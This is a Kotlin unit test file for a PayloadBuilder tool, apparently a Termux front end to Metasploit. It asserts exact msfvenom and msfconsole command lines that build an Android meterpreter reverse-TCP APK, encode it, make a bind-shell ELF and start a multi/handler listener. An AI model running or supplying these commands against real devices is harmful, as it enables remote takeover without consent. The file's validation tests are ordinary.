package com.victorious.victordrax.tools

import com.victorious.victordrax.tools.spec.PayloadBuilder
import org.junit.Assert.*
import org.junit.Test

class PayloadBuilderTest {
    private fun ok(r: PayloadBuilder.Result) = r as PayloadBuilder.Result.Ok
    private fun err(r: PayloadBuilder.Result) = (r as PayloadBuilder.Result.Err).message

    private val base = PayloadBuilder.Options(
        payload = "android/meterpreter/reverse_tcp", lhost = "10.0.0.5", lport = "4444",
        format = "apk", outDir = "/data/data/com.termux/files/home", fileName = "app.apk")

    @Test fun buildsReverseTcpApk() {
        val r = ok(PayloadBuilder.buildPayload(base))
        assertEquals(listOf("msfvenom", "-p", "android/meterpreter/reverse_tcp", "LHOST=10.0.0.5",
            "LPORT=4444", "-f", "apk", "-o", "/data/data/com.termux/files/home/app.apk"), r.argv)
        assertEquals("/data/data/com.termux/files/home/app.apk", r.outPath)
    }

    @Test fun includesEncoderAndIterations() {
        val r = ok(PayloadBuilder.buildPayload(base.copy(encoder = "x86/shikata_ga_nai", iterations = "3")))
        assertTrue(r.argv.containsAll(listOf("-e", "x86/shikata_ga_nai", "-i", "3")))
    }

    @Test fun iterationsNeedEncoder() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(iterations = "3"))).contains("encoder"))
    }

    @Test fun iterationsRangeChecked() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(encoder = "x86/shikata_ga_nai", iterations = "99"))).contains("between 0 and 50"))
    }

    @Test fun reverseRequiresLhost() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(lhost = ""))).contains("LHOST"))
    }

    @Test fun bindPayloadNeedsNoLhost() {
        val r = PayloadBuilder.buildPayload(base.copy(payload = "linux/x64/shell_bind_tcp", lhost = "", format = "elf", fileName = "s.elf"))
        assertTrue(r is PayloadBuilder.Result.Ok)
        assertFalse((r as PayloadBuilder.Result.Ok).argv.any { it.startsWith("LHOST=") })
    }

    @Test fun rejectsBadPort() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(lport = "70000"))).contains("1 and 65535"))
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(lport = "abc"))).contains("1 and 65535"))
    }

    @Test fun rejectsBadFormat() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(format = "virus"))).contains("format"))
    }

    @Test fun rejectsBadFilename() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(fileName = "../../etc/passwd"))).contains("filename"))
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(fileName = "a b.apk"))).contains("filename"))
    }

    @Test fun rejectsBadOutDir() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(outDir = "relative/path"))).contains("absolute"))
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(outDir = "/a/../b"))).contains("absolute"))
    }

    @Test fun rejectsBadPayload() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(payload = "not a payload!"))).contains("invalid"))
    }

    @Test fun rejectsBadLhost() {
        assertTrue(err(PayloadBuilder.buildPayload(base.copy(lhost = "bad!host"))).contains("valid IP or hostname"))
    }

    @Test fun buildsHandler() {
        val r = ok(PayloadBuilder.buildHandler(base))
        assertEquals(listOf("msfconsole", "-q", "-x",
            "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit -j"), r.argv)
    }

    @Test fun handlerRequiresLhostForReverse() {
        assertTrue(err(PayloadBuilder.buildHandler(base.copy(lhost = ""))).contains("LHOST"))
    }

    @Test fun handlerBadPort() {
        assertTrue(err(PayloadBuilder.buildHandler(base.copy(lport = "0"))).contains("1 and 65535"))
    }

    @Test fun catalogsAreNonEmptyAndValid() {
        assertTrue(PayloadBuilder.PAYLOADS.isNotEmpty())
        assertTrue(PayloadBuilder.FORMATS.contains("raw"))
        assertEquals("", PayloadBuilder.ENCODERS.first())
    }
}
